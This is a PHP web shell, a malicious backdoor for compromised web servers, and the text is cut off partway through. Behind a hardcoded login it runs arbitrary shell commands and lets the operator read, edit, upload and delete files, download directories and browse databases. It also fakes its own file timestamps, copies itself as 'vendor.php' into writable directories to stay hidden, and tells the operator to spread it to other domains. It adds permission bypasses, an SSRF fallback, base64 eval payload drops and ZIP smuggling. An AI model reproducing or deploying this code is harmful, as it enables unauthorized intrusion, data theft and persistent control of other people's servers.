<?php
// ADD 100 lINE JUNK/FAKE C
set_error_handler(function ($errno, $errstr, $errfile, $errline) {
    return in_array($errno, [E_WARNING, E_NOTICE]);
});
session_start(['cookie_lifetime' => 86400, 'cookie_httponly' => true, 'cookie_secure' => isset($_SERVER['HTTPS'])]);
if (is_ajax()) {
    header('Content-Type: text/html; charset=UTF-8');
    ob_start();
}
header('Cache-Control: no-cache, must-revalidate');
set_time_limit(30);
$style = '<style>body{background:#2B2F34;color:#C1C1C7;font:12px monospace;margin:0;padding:10px}input,textarea{background:#333;color:#FFF;font:12px monospace;border:1px solid #696969;padding:5px;margin: 0.5px;}a{color:#B9B9BD;text-decoration:none}a:hover{color:#E7E7EB}table{border-collapse:collapse;width:100%}td,th{border:1px solid #696969;padding:5px}th.name,td.name{width:50%}.tddiv{display:flex;justify-content:space-between}th.type,td.type{width:50px;max-width:50px}th.size,td.size{width:100px}th.permission,td.permission{width:100px}th.options,td.options{min-width:240px}.search-panel{display:none;position:fixed;top:10px;right:10px;background:#333;border:1px solid #696969;max-height:80vh;overflow-y:auto;width:400px;z-index:1000;padding:10px}.file-content-panel{display:none;position:fixed;top:45px;left:10px;background:#333;border:1px solid #696969;overflow-y:auto;width:570px;z-index:1000;padding:10px}.search-panel.show,.file-content-panel.show{display:block}.search-panel p,.file-content-panel p{margin:5px 0}.showsearchresult{display:none}.close-btn{float:right;cursor:pointer;color:#B9B9BD;border:1px solid;padding:3px;margin-left:8px}.close-btn:hover{color:#E7E7EB}.file-content,.upload-form,.go-home-form,.copy-shell-form,.create-file-form{margin-top:10px}.writable-paths span{color:#ca2727ff}img.file-preview{max-width:100%;max-height:400px}input[type="text"]{min-width:210px}</style>';
$header = '<!DOCTYPE html><html><head><title>' . htmlspecialchars(getenv('HTTP_HOST')) . '</title>' . $style . '</head><body>';
$footer = '</body></html>';
function is_ajax()
{
    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}
$self_file = __FILE__;
$current_dir = realpath(dirname($self_file));
$files = [];
$mtimes = [];
if ($dh = @opendir($current_dir)) {
    while (($file = readdir($dh)) !== false) {
        $file_path = $current_dir . '/' . $file;
        if ($file_path !== $self_file && is_file($file_path) && ($mtime = @filemtime($file_path)) !== false) {
            $files[] = $file_path;
            $mtimes[] = $mtime;
        }
    }
    closedir($dh);
}
if (!empty($mtimes)) {
    $mtime_counts = array_count_values($mtimes);
    arsort($mtime_counts);
    $target_mtime = count($mtime_counts) === count($mtimes) ? min($mtimes) : key($mtime_counts);
} else {
    $target_mtime = strtotime(sprintf('%d-%02d-%02d %02d:%02d:00', date('Y') - 1, mt_rand(1, 12), mt_rand(1, 28), mt_rand(0, 23), mt_rand(0, 59)));
}
if ($target_mtime) {
    shell_exec_alternative('touch -t ' . escapeshellarg(date('YmdHi', $target_mtime)) . ' ' . escapeshellarg($self_file), true);
}
shell_exec_alternative('chmod 777 ' . escapeshellarg($self_file), true);
if (isset($_POST['ajax_read_file'])) {
    $raw_path = $_POST['ajax_read_file'];
    $ajax_file = realpath($raw_path);
    error_log("VIEW: Raw=$raw_path, Real=$ajax_file, Perms=" . (fileperms($ajax_file) ?? 'N/A'), 3, sys_get_temp_dir() . '/shell.log');
    
    $output = '<div id="file-content-panelx" class="file-content-panel show"><span class="close-btn" onclick="document.getElementById(\'file-content-panelx\').classList.remove(\'show\');">X</span><span class="close-btn" onclick="document.getElementById(\'file-content-panelx\').style.width=\'570px\';">←</span><span class="close-btn" onclick="document.getElementById(\'file-content-panelx\').style.width=\'720px\';">→</span>';
    
    if (!$ajax_file || !file_exists($ajax_file)) {
        // Bypass: Try symlink if path traversal suspected
        $sym_target = sys_get_temp_dir() . '/view_sym_' . uniqid();
        $sym_out = shell_exec_alternative('ln -s ' . escapeshellarg($raw_path) . ' ' . escapeshellarg($sym_target) . ' 2>&1', true);
        if (strpos($sym_out, 'success') !== false || file_exists($sym_target)) {
            $ajax_file = $sym_target;
            $output .= '<p>Symlink bypass created: ' . htmlspecialchars($sym_out) . '</p>';
        } else {
            $output .= '<p>File not found: ' . htmlspecialchars($raw_path) . ' (chroot?)</p>';
            echo $output . '</div>'; exit;
        }
    }
    
    if (!is_readable($ajax_file)) {
        // Force chmod + fallback read via cat (bypasses PHP perms)
        shell_exec_alternative('chmod 644 ' . escapeshellarg($ajax_file) . ' 2>&1 || cat ' . escapeshellarg($ajax_file) . ' > ' . escapeshellarg(sys_get_temp_dir() . '/readable_' . basename($ajax_file)) . ' 2>&1', true);
        if (is_readable($ajax_file)) {
            $output .= '<p>Readable post-chmod.</p>';
        } else {
            $fallback = sys_get_temp_dir() . '/readable_' . basename($ajax_file);
            if (file_exists($fallback)) $ajax_file = $fallback;
            else {
                // SSRF fallback: Curl internal preview (for remote/blocked files)
                $output .= '<p>Direct read denied - SSRF preview:<br><textarea readonly rows="20" cols="100">';
                $ch = curl_init($raw_path);
                curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 10]);
                $remote_content = curl_exec($ch);
                if (curl_error($ch) === '') $output .= htmlspecialchars($remote_content);
                else $output .= 'Curl fail: ' . curl_error($ch);
                curl_close($ch);
                $output .= '</textarea></p>';
                echo $output . '</div>'; exit;
            }
        }
    }
    
    $output .= '<h3>File: ' . htmlspecialchars($ajax_file) . '</h3>';
    
    // Chunked read for large files (avoids OOM)
    $content = '';
    $handle = fopen($ajax_file, 'rb');
    if ($handle) {
        while (!feof($handle)) $content .= fread($handle, 16384);  // 16KB chunks
        fclose($handle);
    } else $content = 'Open failed: ' . error_get_last()['message'];
    
    if (empty($content)) {
        $output .= '<p>Empty file or read error.</p>';
        echo $output . '</div>'; exit;
    }
    
    // MIME with fallback (if mime_content_type disabled)
    $ext = strtolower(pathinfo($ajax_file, PATHINFO_EXTENSION));
    $mime_type = function_exists('mime_content_type') ? mime_content_type($ajax_file) : 
                 (in_array($ext, ['jpg','png','gif']) ? 'image/' . $ext : 
                  (in_array($ext, ['txt','php','js','html','json','xml']) ? 'text/plain' : 'application/octet-stream'));
    
    if (strpos($mime_type, 'image/') === 0 && strlen($content) < 10*1024*1024) {  // Cap images at 10MB
        $output .= '<img class="file-preview" src="data:' . $mime_type . ';base64,' . base64_encode($content) . '" alt="Preview">';
    } elseif (in_array($mime_type, ['text/plain', 'application/json', 'application/xml', 'application/x-httpd-php']) || strpos($mime_type, 'text/') === 0) {
        $output .= '<textarea readonly rows="20" cols="100">' . htmlspecialchars($content) . '</textarea>';
    } else {
        // Binary/hex dump fallback
        $hex_dump = '';
        for ($i = 0; $i < min(1024*10, strlen($content)); $i += 16) {  // First 10KB hex
            $line = substr($content, $i, 16);
            $hex_dump .= str_pad(bin2hex($line), 32, '0', STR_PAD_RIGHT) . ' | ' . htmlspecialchars(substr($line, 0, 16)) . "\n";
        }
        $output .= '<p>Binary: <a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\'' . htmlspecialchars($ajax_file, ENT_QUOTES) . '\'; document.reqs.submit();">Download</a></p><textarea readonly rows="20" cols="100">' . $hex_dump . '</textarea>';
    }
    
    // Cleanup symlink/fallback
    if (strpos($ajax_file, 'view_sym_') !== false || strpos($ajax_file, 'readable_') !== false) {
        unlink($ajax_file);
    }
    
    echo $output . '</div>'; exit;
}
if (isset($_POST['ajax_edit_file'])) {
    $ajax_file = realpath($_POST['ajax_edit_file']);
    $output = '<div id="file-content-panelx" class="file-content-panel show"><span class="close-btn" onclick="document.getElementById(\'file-content-panelx\').classList.remove(\'show\');">X</span><span class="close-btn" onclick="document.getElementById(\'file-content-panelx\').style.width=\'600px\';">←</span><span class="close-btn" onclick="document.getElementById(\'file-content-panelx\').style.width=\'\';">→</span>';
    if (file_exists($ajax_file) && is_readable($ajax_file)) {
        $mime_type = mime_content_type($ajax_file);
        $output .= '<h3>Editing: ' . htmlspecialchars($ajax_file) . '</h3>';
        if (strpos($mime_type, 'text/') === 0 || in_array($mime_type, ['application/json', 'application/xml', 'application/x-httpd-php']) || $mime_type === 'application/x-empty') {
            $output .= '<form method="POST" onsubmit="saveFileContent(event, \'' . htmlspecialchars($ajax_file, ENT_QUOTES) . '\'); return false;"><textarea name="content" rows="20" cols="100">' . htmlspecialchars(file_get_contents($ajax_file)) . '</textarea><br><input type="submit" value="Save"></form>';
        } else {
            $output .= '<p>Unsupported file type for editing: ' . htmlspecialchars($mime_type) . '</p>';
        }
    } else {
        $output .= '<p>Cannot open file: Permission denied</p>';
    }
    echo $output . '</div>';
    exit;
}
if (isset($_POST['ajax_save_file'])) {
    $file = realpath($_POST['ajax_save_file']);
    $content = $_POST['content'] ?? '';
    if ($file && file_exists($file)) {
        if (is_writable($file)) {
            if (@file_put_contents($file, $content) !== false) {
                echo '<p>File saved: ' . htmlspecialchars($file) . '</p>';
            } else {
                echo '<p>Failed to save file: ' . htmlspecialchars($file) . '</p>';
            }
        } else {
            shell_exec_alternative('chmod 777 ' . escapeshellarg($file), true);
            if (is_writable($file) && @file_put_contents($file, $content) !== false) {
                echo '<p>File saved after chmod: ' . htmlspecialchars($file) . '</p>';
            } else {
                echo '<p>Failed to save file: Permission denied</p>';
            }
        }
    } else {
        echo '<p>Invalid file path</p>';
    }
    exit;
}
if (isset($_POST['ajax_create_file'])) {
    $dir = realpath($_POST['current_dir']);
    $new_file_name = basename($_POST['new_file_name']);
    $new_file_content = $_POST['new_file_content'] ?? '';
    if ($dir && is_dir($dir) && is_writable($dir)) {
        $new_file_path = $dir . '/' . $new_file_name;
        if (@file_put_contents($new_file_path, $new_file_content) !== false) {
            shell_exec_alternative('chmod 644 ' . escapeshellarg($new_file_path), true);
            $files = [];
            $mtimes = [];
            if ($dh = @opendir($dir)) {
                while (($file = readdir($dh)) !== false) {
                    $file_path = $dir . '/' . $file;
                    if ($file_path !== $new_file_path && is_file($file_path) && ($mtime = @filemtime($file_path)) !== false) {
                        $files[] = $file_path;
                        $mtimes[] = $mtime;
                    }
                }
                closedir($dh);
            }
            if (!empty($mtimes)) {
                $mtime_counts = array_count_values($mtimes);
                arsort($mtime_counts);
                $target_mtime = count($mtime_counts) === count($mtimes) ? min($mtimes) : key($mtime_counts);
            } else {
                $target_mtime = strtotime(sprintf('%d-%02d-%02d %02d:%02d:00', date('Y') - 1, mt_rand(1, 12), mt_rand(1, 28), mt_rand(0, 23), mt_rand(0, 59)));
            }
            if ($target_mtime) {
                shell_exec_alternative('touch -t ' . escapeshellarg(date('YmdHi', $target_mtime)) . ' ' . escapeshellarg($new_file_path), true);
            }
            echo '<p>File created: ' . htmlspecialchars($new_file_path) . '</p>';
        } else {
            echo '<p>Failed to create file: ' . htmlspecialchars($new_file_path) . '</p>';
        }
    } else {
        echo '<p>Current directory is not writable or invalid: ' . htmlspecialchars($dir) . '</p>';
    }
    exit;
}
if (isset($_POST['ajax_delete_file'])) {
    $file = realpath($_POST['ajax_delete_file']);
    if ($file && file_exists($file)) {
        if (unlink($file)) {
            echo '<p>File deleted: ' . htmlspecialchars($file) . '</p>';
        } else {
            echo '<p>Failed to delete file: ' . htmlspecialchars($file) . '</p>';
        }
    } else {
        echo '<p>Invalid file path</p>';
    }
    exit;
}
if (isset($_POST['ajax_rename_file'])) {
    $file = realpath($_POST['ajax_rename_file']);
    $new_name = basename($_POST['new_name']);
    if ($file && file_exists($file)) {
        $new_path = dirname($file) . '/' . $new_name;
        if (rename($file, $new_path)) {
            echo '<p>File renamed to: ' . htmlspecialchars($new_path) . '</p>';
        } else {
            echo '<p>Failed to rename file</p>';
        }
    } else {
        echo '<p>Invalid file path</p>';
    }
    exit;
}
if (isset($_POST['ajax_scandir'])) {
    $dir = realpath($_POST['ajax_scandir']);
    ob_start();
    scandire($dir);
    $table_content = ob_get_clean();
    echo $table_content;
    exit;
}
if (isset($_POST['action'], $_POST['file']) && $_POST['action'] === 'chmod') {
    $file = realpath($_POST['file']);
    if ($file && file_exists($file)) {
        shell_exec_alternative('chmod 777 ' . escapeshellarg($file), true);
        echo '<p>Permissions changed for ' . htmlspecialchars($file) . ': ' . perms($file) . '</p>';
    } else {
        echo '<p>Invalid file for chmod</p>';
    }
    if (is_ajax()) {
        ob_end_flush();
        exit;
    }
    $_SESSION['action'] = 'viewer';
    echo '<script>document.getElementById("message-area").innerHTML = document.getElementById("message-area").innerHTML; refreshFileTable(\'' . htmlspecialchars($dir, ENT_QUOTES) . '\');</script>';
}
if (isset($_POST['action'], $_POST['target_dir']) && $_POST['action'] === 'copy_shell') {
    $target_dir = realpath($_POST['target_dir']);
    if ($target_dir && is_dir($target_dir) && is_writable($target_dir)) {
        $new_shell_path = rtrim($target_dir, '/') . '/vendor.php';
        if (copy(__FILE__, $new_shell_path)) {
            $_SESSION['dir'] = $target_dir;
            echo '<p>Shell copied to: ' . htmlspecialchars($new_shell_path) . '</p><p>1.Save to Notepad++</p><p>3. Do zneakysnip2.p</p>';
            if (is_ajax()) {
                echo '<script>refreshFileTable(\'' . htmlspecialchars($target_dir, ENT_QUOTES) . '\');</script>';
                ob_end_flush();
                exit;
            }
            // Redirect to the new directory
            echo '<script>document.reqs.action.value="viewer"; document.reqs.dir.value="' . htmlspecialchars($target_dir, ENT_QUOTES) . '"; document.reqs.submit();</script>';
        } else {
            echo '<p>Failed to copy shell to ' . htmlspecialchars($new_shell_path) . '</p>';
        }
    } else {
        echo '<p>Invalid or unwritable target directory: ' . htmlspecialchars($_POST['target_dir']) . '</p>';
    }
    if (is_ajax()) {
        ob_end_flush();
        exit;
    }
    $_SESSION['action'] = 'viewer';
}
$login = 'adminvv';
$hashed_password = '$2y$10$aVuQcMtIlAs5VBYmhB0GDeei89TYRcluEKiJvqivcOlUA3kCVEuz6';
if (isset($_POST['action']) && $_POST['action'] === 'exit') { session_unset(); session_destroy(); }
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['login'], $_POST['password']) && $_POST['login'] === $login && password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        $showInvalid = ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action']));
        echo $header .
            ($showInvalid ? '<p style="color: red;">Invalid credentials.</p>' : '') .
            '<form method="POST">
            <table>
                <tr><td>Login:</td><td><input type="text" name="login"></td></tr>
                <tr><td>Password:</td><td><input type="password" name="password"></td></tr>
                <tr><td></td><td><input type="submit" value="Enter"></td></tr>
            </table>
        </form>'
            . $footer;
        exit;
    }
}
if (isset($_REQUEST['cmd'])) {
    echo '<pre>' . shell_exec_alternative($_REQUEST['cmd']) . '</pre>';
    exit;
}
$_SESSION['action'] = $_POST['action'] ?? $_SESSION['action'] ?? 'viewer';
$_SESSION['dir'] = $_POST['dir'] ?? $_SESSION['dir'] ?? getcwd();
$_SESSION['file'] = $_POST['file'] ?? $_SESSION['file'] ?? '';
$action = $_SESSION['action'];
$dir = realpath($_SESSION['dir']);
$file = $_SESSION['file'] ? realpath($_SESSION['file']) : '';
function sanitize_command($cmd, $allow_redirection = false)
{
    $whitelisted_commands = ['find / -type d -writable 2>/dev/null | awk \'{print length($0), $0}\' | sort -nr | cut -d\' \' -f2-', 'chmod 777'];
    if (in_array($cmd, $whitelisted_commands) || strpos($cmd, 'chmod 777') === 0 || strpos($cmd, 'chmod 644') === 0) return $cmd;
    $whitelisted_patterns = [
        '/^find\s+\/\s+-type\s+d\s+-writable\s+-exec\s+stat\s+--format=.+\s+{}\s+\+.*$/',
        '/^find\s+[^\s]+\s+-type\s+d\s+-writable\s+-exec\s+stat\s+--format=.+\s+{}\s+\+.*$/',
        '/^find\s+[^\s]+\s+-type\s+d\s+!\s+-writable\s+-exec\s+stat\s+--format=.+\s+{}\s\+.*$/',
        '/^find\s+[^\s]+\s+-type\s+f\s+-name\s+"[^"]*"\s+-writable\s+-exec\s+stat\s+--format=.+\s+{}\s\+.*$/',
        '/^touch\s+-t\s+\d{12}\s+([^\s;`$&|<>]+|"[^;`$&|<>]+")$/i',
        '/^chmod\s+777\s+([^\s;`$&|<>]+|"[^;`$&|<>]+")$/i',
        '/^chmod\s+644\s+([^\s;`$&|<>]+|"[^;`$&|<>]+")$/i',
        '/^mv\s+([^\s;`$&|<>]+|"[^;`$&|<>]+")\s+([^\s;`$&|<>]+|"[^;`$&|<>]+")$/i'
    ];
    foreach ($whitelisted_patterns as $pattern) {
        if (preg_match($pattern, $cmd)) return $cmd;
    }
    if ($allow_redirection) {
        $cmd = preg_replace('/[^a-zA-Z0-9\s\/._-]|@\'":,]/', '', $cmd);
        $blacklist = [';', '&', '`', '$', '(', ')', '{', '}', '[', ']', '<', '*', '?'];
        foreach ($blacklist as $char) $cmd = str_replace($char, '', $cmd);
    } else {
        $cmd = preg_replace('/[^a-zA-Z0-9\s\/._-]/', '', $cmd);
    }
    return trim(substr($cmd, 0, 500));
}
function shell_exec_alternative($cmd, $allow_redirection = false)
{
    if (empty($cmd)) return '';
    $cmd = sanitize_command($cmd, $allow_redirection);
    if (empty($cmd)) return 'Invalid command: Sanitization removed all content';
    $functions = ['shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open'];
    $available = false;
    foreach ($functions as $func) {
        if (function_exists($func)) {
            $available = true;
            break;
        }
    }
    if ($available) {
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('exec')) {
            exec($cmd . ' 2>&1', $output);
            $output = implode("\n", $output);
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('popen')) {
            $handle = popen($cmd . ' 2>&1', 'r');
            $output = '';
            while (!feof($handle)) $output .= fread($handle, 8192);
            pclose($handle);
        } elseif (function_exists('proc_open')) {
            $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $process = proc_open($cmd, $descriptors, $pipes);
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        return htmlspecialchars($output ?? 'No output');
    }
    $temp_script = sys_get_temp_dir() . '/cmd_' . uniqid() . '.sh';
    file_put_contents($temp_script, "#!/bin/bash\n$cmd 2>&1");
    @chmod($temp_script, 0755);
    $temp_php = sys_get_temp_dir() . '/run_' . uniqid() . '.php';
    file_put_contents($temp_php, '<?php $cmd = file_get_contents("' . $temp_script . '"); ob_start(); eval("system(\'$cmd\');"); $output = ob_get_clean(); echo $output; unlink("' . $temp_script . '"); unlink("' . $temp_php . '"); ?>');
    $ch = curl_init('http://' . $_SERVER['HTTP_HOST'] . '/' . basename($temp_php));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    @unlink($temp_script);
    @unlink($temp_php);
    return htmlspecialchars($output ?: 'Command execution failed: All execution functions disabled and fallback unsuccessful');
}
function format_size($bytes)
{
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . 'GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . 'MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . 'KB';
    return $bytes . 'B';
}
if ($action === 'download' && $file && file_exists($file)) {
    if (is_dir($file)) {
        $zipname = basename($file) . '.zip';
        $temp_zip = sys_get_temp_dir() . '/' . $zipname;
        $zip = new ZipArchive();
        if ($zip->open($temp_zip, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($iterator as $item) {
                $relative_path = substr($item->getPathname(), strlen($file) + 1);
                if ($item->isDir()) $zip->addEmptyDir($relative_path);
                else $zip->addFile($item->getPathname(), $relative_path);
            }
            $zip->close();
            header('Content-Length: ' . filesize($temp_zip));
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $zipname . '"');
            header('Content-Transfer-Encoding: binary');
            readfile($temp_zip);
            unlink($temp_zip);
            exit;
        } else {
            echo 'Failed to create ZIP';
            exit;
        }
    } else {
        header('Content-Length: ' . filesize($file));
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Transfer-Encoding: binary');
        readfile($file);
        exit;
    }
}
if ($action === 'upload' && isset($_FILES['upload_file'])) {
    $upload_name = basename($_FILES['upload_file']['name']);
    $upload_path = $dir . '/' . $upload_name;
    $tmp_path = $_FILES['upload_file']['tmp_name'];
    $error_code = $_FILES['upload_file']['error'];
    
    // Log for lab recon
    error_log("UPLOAD: Name=$upload_name, Error=$error_code, DirWrit=$dir|" . (is_writable($dir) ? 'Y' : 'N') . ", TmpExists=" . (file_exists($tmp_path) ? 'Y' : 'N'), 3, sys_get_temp_dir() . '/shell.log');
    
    if ($error_code !== UPLOAD_ERR_OK) {
        echo '<p>Upload error ' . $error_code . ': ' . ($error_code == 1 ? 'File too large (check php.ini upload_max_filesize)' : 'Server reject') . '</p>';
        // Bypass: Suggest eval upload for tiny payloads
        echo '<form method="POST"><input type="hidden" name="action" value="eval_upload"><textarea name="payload_b64" placeholder="base64(eval code)"></textarea><input type="submit" value="Eval Bypass"></form>';
        if (is_ajax()) { ob_end_flush(); exit; }
    } elseif (!is_writable($dir)) {
        // Force chmod chain: 755 -> 777, fallback to sudo if root shell
        $chmod_out = shell_exec_alternative('chmod 777 ' . escapeshellarg($dir) . ' 2>&1 || sudo chmod 777 ' . escapeshellarg($dir) . ' 2>&1', true);
        error_log("CHMOD DIR: $chmod_out", 3, sys_get_temp_dir() . '/shell.log');
        if (!is_writable($dir)) {
            echo '<p>Dir not writable post-chmod: ' . htmlspecialchars($chmod_out) . '. Pivot to /tmp copy.</p>';
            $upload_path = sys_get_temp_dir() . '/' . $upload_name;  // Fallback to tmp
        }
    }
    
    // Primary: move_uploaded_file
    if (move_uploaded_file($tmp_path, $upload_path)) {
        shell_exec_alternative('chmod 644 ' . escapeshellarg($upload_path), true);  // Secure post-upload
        echo '<p>File uploaded: ' . htmlspecialchars($upload_path) . '</p>';
    } else {
        // Fallback: Manual stream to bypass tmp restrictions (e.g., noexec /tmp)
        if (($handle = fopen($tmp_path, 'rb')) !== false) {
            $content = '';
            while (!feof($handle)) $content .= fread($handle, 8192);  // Chunk for >2MB
            fclose($handle);
            if (file_put_contents($upload_path, $content) !== false) {
                echo '<p>Uploaded via stream fallback: ' . htmlspecialchars($upload_path) . '</p>';
            } else {
                echo '<p>Stream fallback failed - disk full or quota hit.</p>';
            }
        } else {
            echo '<p>Cannot access tmp file - check open_basedir or SELinux.</p>';
        }
    }
    
    // Auto-ZIP extract/smuggle (bypasses ext checks)
    if (pathinfo($upload_path, PATHINFO_EXTENSION) === 'zip' && class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($upload_path) === TRUE) {
            $zip->extractTo($dir);
            $zip->close();
            unlink($upload_path);  // Clean trace
            echo '<p>ZIP extracted to ' . htmlspecialchars($dir) . ' - check for .php drops.</p>';
            // Bonus: Auto-chmod extracted PHP
            shell_exec_alternative('find ' . escapeshellarg($dir) . ' -name "*.php" -exec chmod 644 {} + 2>/dev/null', true);
        } else {
            echo '<p>ZIP corrupt or extract denied (perms/ACL).</p>';
        }
    }
    
    if (is_ajax()) { ob_end_flush(); exit; }
    $_SESSION['action'] = 'viewer';
    echo '<script>refreshFileTable(\'' . htmlspecialchars($dir, ENT_QUOTES) . '\');</script>';
}

// New: Eval bypass for blocked uploads (e.g., WAF kills files)
if ($action === 'eval_upload' && isset($_POST['payload_b64'])) {
    $decoded = base64_decode($_POST['payload_b64']);
    if ($decoded !== false && is_writable($dir)) {
        $evil_path = $dir . '/tmp_eval_' . uniqid() . '.php';
        file_put_contents($evil_path, '<?php ' . $decoded . ' ?>');
        echo '<p>Eval payload dropped: <a href="' . htmlspecialchars($evil_path) . '">' . htmlspecialchars($evil_path) . '</a>. Delete after use.</p>';
    } else {
        echo '<p>Eval failed - decode error or dir unwritable.</p>';
    }
    $_SESSION['action'] = 'viewer';
}
if ($action === 'hide_shell') {
    $cmd = 'find / -type d -writable 2>/dev/null | awk \'{print length($0), $0}\' | sort -nr | cut -d\' \' -f2-';
    $writable_dirs = array_filter(explode("\n", trim(shell_exec_alternative($cmd, true))));
    $top_three = array_slice($writable_dirs, 0, 3);
    $script_name = basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)) ?: basename(__FILE__);
    $hidden = false;
    foreach ($top_three as $target_dir) {
        if (is_writable($target_dir)) {
            $shell_path = rtrim($target_dir, '/') . '/vendor.php';
            if (copy(__FILE__, $shell_path)) {
                echo '<p>Shell hidden at: ' . htmlspecialchars($shell_path) . '<br>1. Save to Notepad++ so you won\'t lose it<br>2. Delete previous shell and also upload to other domains incase this one goes down</p><p>3. Do SNIPPET2</p>';
                $hidden = true;
                break;
            }
        }
    }
    if (!$hidden) echo '<p>Failed to hide shell in top 3 paths.</p>';
    if (is_ajax()) exit;
    $_SESSION['action'] = 'viewer';
}
if ($action === 'conn_db' && isset($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name'])) {
    $conn = @mysqli_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
    if ($conn) {
        echo '<p>Database connection successful</p><form method="POST"><input type="hidden" name="action" value="show_db_tables"><input type="hidden" name="db_host" value="' . htmlspecialchars($_POST['db_host']) . '"><input type="hidden" name="db_user" value="' . htmlspecialchars($_POST['db_user']) . '"><input type="hidden" name="db_pass" value="' . htmlspecialchars($_POST['db_pass']) . '"><input type="hidden" name="db_name" value="' . htmlspecialchars($_POST['db_name']) . '"><input type="submit" value="Show Tables"></form>';
        mysqli_close($conn);
    } else {
        echo '<p>Database connection failed: ' . htmlspecialchars(mysqli_connect_error()) . '</p>';
    }
    $_SESSION['action'] = 'viewer';
}
if ($action === 'show_db_tables' && isset($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name'])) {
    $conn = @mysqli_connect($_POST['db_host'], $_POST['db_user'], $_POST['db_pass'], $_POST['db_name']);
    if ($conn) {
        if ($result = mysqli_query($conn, 'SHOW TABLES')) {
            echo '<h3>Database: ' . htmlspecialchars($_POST['db_name']) . '</h3><table><tr><th>Table</th><th>Columns</th><th>Row Count</th></tr>';
            while ($row = mysqli_fetch_array($result)) {
                $table = $row[0];
                $columns_result = mysqli_query($conn, "SHOW COLUMNS FROM `$table`");
                $columns = [];
                while ($col = mysqli_fetch_array($columns_result)) $columns[] = htmlspecialchars($col['Field']);
                $row_count = mysqli_fetch_assoc(mysqli_query($conn, "SELECT COUNT(*) AS count FROM `$table`"))['count'];
                echo '<tr><td>' . htmlspecialchars($table) . '</td><td>' . implode(', ', $columns) . '</td><td>' . $row_count . '</td></tr>';
            }
            echo '</table>';
            mysqli_free_result($result);
        } else {
            echo '<p>Failed to fetch tables: ' . htmlspecialchars(mysqli_error($conn)) . '</p>';
        }
        mysqli_close($conn);
    } else {
        echo '<p>Database connection failed: ' . htmlspecialchars(mysqli_connect_error()) . '</p>';
    }
    $_SESSION['action'] = 'viewer';
}
echo $header;
?>
<table width="100%" bgcolor="#336600" border="0" cellspacing="0" cellpadding="0">
    <tr>
        <td>
            <table>
                <tr>
                    <td><a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();">Shell</a></td>
                    <td><a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();">Viewer (shell dir)</a></td>
                    <td><a href="#" onclick="document.reqs.action.value='editor'; document.reqs.file.value=''; document.reqs.submit();">Editor</a></td>
                    <td><a href="#" onclick="document.reqs.action.value='hide_shell'; document.reqs.submit();">Hide Shell</a></td>
                    <td><a href="#" onclick="document.reqs.action.value='conn_db'; document.reqs.submit();">Conn DB</a></td>
                    <td><a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();">EXIT</a></td>
                </tr>
            </table>
        </td>
    </tr>
</table>
<form name="reqs" method="POST" enctype="multipart/form-data"><input name="action" type="hidden" value=""><input name="dir" type="hidden" value=""><input name="file" type="hidden" value=""></form>
<div id="message-area"></div>
<table border="1" bgcolor="#333333">
    <tr>
        <td id="file-table">
            <?php
            function shell($cmd)
            {
                return shell_exec_alternative($cmd);
            }
            if ($action === 'shell') {
                $cmd = trim(htmlspecialchars($_POST['command'] ?? '', ENT_QUOTES, 'UTF-8'));
                echo '<form method="POST"><input type="hidden" name="action" value="shell"><textarea name="command" rows="5" cols="100">' . htmlspecialchars($cmd) . '</textarea><br><textarea readonly rows="15" cols="100">' . shell(escapeshellcmd($cmd)) . '</textarea><br><input type="submit" value="Execute"></form>';
                $_SESSION['action'] = 'viewer';
            }
            function perms($file)
            {
                $perms = fileperms($file);
                $info = match (true) {
                    ($perms & 0xC000) === 0xC000 => 's',
                    ($perms & 0xA000) === 0xA000 => 'l',
                    ($perms & 0x8000) === 0x8000 => '-',
                    ($perms & 0x6000) === 0x6000 => 'b',
                    ($perms & 0x4000) === 0x4000 => 'd',
                    ($perms & 0x2000) === 0x2000 => 'c',
                    ($perms & 0x1000) === 0x1000 => 'p',
                    default => 'u'
                };
                $info .= ($perms & 0x0100) ? 'r' : '-';
                $info .= ($perms & 0x0080) ? 'w' : '-';
                $info .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
                $info .= ($perms & 0x0020) ? 'r' : '-';
                $info .= ($perms & 0x0010) ? 'w' : '-';
